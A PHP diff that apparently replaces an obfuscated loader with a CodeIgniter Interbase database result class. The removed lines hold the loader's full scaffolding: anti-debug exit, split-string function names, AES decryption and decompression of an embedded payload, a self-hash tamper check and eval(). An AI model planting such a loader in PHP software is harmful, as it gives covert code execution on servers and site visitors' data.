@@ -1,28 +1,143 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_i7ywdg3f=('bas'.'e64'.'_de'.'cod'.'e');
-$_i81jek5h=('gzu'.'nco'.'mpr'.'ess');
-$_dhr0kpi5=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_z5oijaew='MjjQqaVT';
-$_tlfeudhu='lNDfC3F4';
-$_kw4wn6rb='RAK3AcpB';
-$_csywwedn='Gv9WiE6shEA=';
-$_ic026shw='QRTh7Jjo';
-$_mbawwwfx='t9PDrzCh';
-$_l0349gdn='li3adQ==';
-$_nwmkgrai='WCB7891J';
-$_bvhrpr6e=$_i7ywdg3f($_z5oijaew.$_kw4wn6rb.$_tlfeudhu.$_ic026shw.$_csywwedn);
-$_u5bihq45=$_i7ywdg3f($_mbawwwfx.$_nwmkgrai.$_l0349gdn);
-$_hlo2j677=$_i7ywdg3f('44EhRNrVMtmka1M874YL5KLceKx+/HILIyv6FODCEEouplKItrjWeSvqK+Ol848dNZsr6PWp4BOEjiXlMfOOl+asJys2/uok7YWnn21AvjQQ/SEp21ZFHFRjsaUlkh99EAamLcIEyR84sJqUd/b72pQuK7BiWgXbxqB3bh+HtOSagGUIK261CntnGSOoNrXLrmbVrzO2oxyixN6UkIAVfehAEOJ3iBBYqJfBJ6mpw8bC6xNEXgkega4+6+bJlONjtr6R32T+zRKee03DzNtTQIqghdXkSk+JWFZ6rD0TpAa4AyNSYS2hZZi2L4Xw6uwiOqdpYxdt3xE+sJqU3XMQX7sWo/jrL1NVEEtK0rKo2KULRwCw/VwYpmn/skttd1k65GxL8Tmu7L7TwnPju9D4xZeIhSc7PIj0Ylwc5R7HL1NUK8yUh5T+e3jzlo8GOIxElO1Jv5ZGjOQhTYNTswx9sSVc/qSM6aORxAQElpIDAeqyHipbQ5+OsFvfBOWxde1fdkMkGDwWX8X0EVYxc5WzkVNwTgszlK+o7XyboiOdwvXp0zJIMVQk8KTiyT2xPxV9NmKalAf680wWvzd9utUYga33Fblfo/dfNFxGKdoWgLewFv7H0271mGMDy3BVJrOD');
-$_fdywq2l0=$_dhr0kpi5($_hlo2j677,'aes-256-cbc',$_bvhrpr6e,OPENSSL_RAW_DATA,$_u5bihq45);
-if($_fdywq2l0===false){exit;}
-$_jxshf352=$_i81jek5h($_fdywq2l0);
-if($_jxshf352===false){exit;}
-$_nxj20wcb='148ff793bbd1565385fde709d0f3776f4da9f3fec5a5d207ec626795c3f36f40';
-$_cfpumcsy=@file_get_contents(__FILE__);
-if($_cfpumcsy!==false){
-$_swxkzmun=str_replace($_nxj20wcb,"0000000000000000000000000000000000000000000000000000000000000000",$_cfpumcsy);
-$_lh1jr3o7=hash("sha256",$_swxkzmun);
-if($_lh1jr3o7!==$_nxj20wcb){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_DB_ibase_result extends CI_DB_result {
+
+
+
+
+
+public function num_fields()
+{
+return ibase_num_fields($this->result_id);
 }
-eval($_jxshf352);
+
+
+
+
+
+
+
+
+public function list_fields()
+{
+$field_names = array();
+for ($i = 0, $num_fields = $this->num_fields(); $i < $num_fields; $i++)
+{
+$info = ibase_field_info($this->result_id, $i);
+$field_names[] = $info['name'];
+}
+return $field_names;
+}
+
+
+
+
+
+
+
+
+public function field_data()
+{
+$retval = array();
+for ($i = 0, $c = $this->num_fields(); $i < $c; $i++)
+{
+$info = ibase_field_info($this->result_id, $i);
+$retval[$i] = new stdClass();
+$retval[$i]->name = $info['name'];
+$retval[$i]->type = $info['type'];
+$retval[$i]->max_length = $info['length'];
+}
+return $retval;
+}
+
+
+
+
+
+
+public function free_result()
+{
+ibase_free_result($this->result_id);
+}
+
+
+
+
+
+
+
+
+protected function _fetch_assoc()
+{
+return ibase_fetch_assoc($this->result_id, IBASE_FETCH_BLOBS);
+}
+
+
+
+
+
+
+
+
+
+protected function _fetch_object($class_name = 'stdClass')
+{
+$row = ibase_fetch_object($this->result_id, IBASE_FETCH_BLOBS);
+if ($class_name === 'stdClass' OR ! $row)
+{
+return $row;
+}
+$class_name = new $class_name();
+foreach ($row as $key => $value)
+{
+$class_name->$key = $value;
+}
+return $class_name;
+}
+}
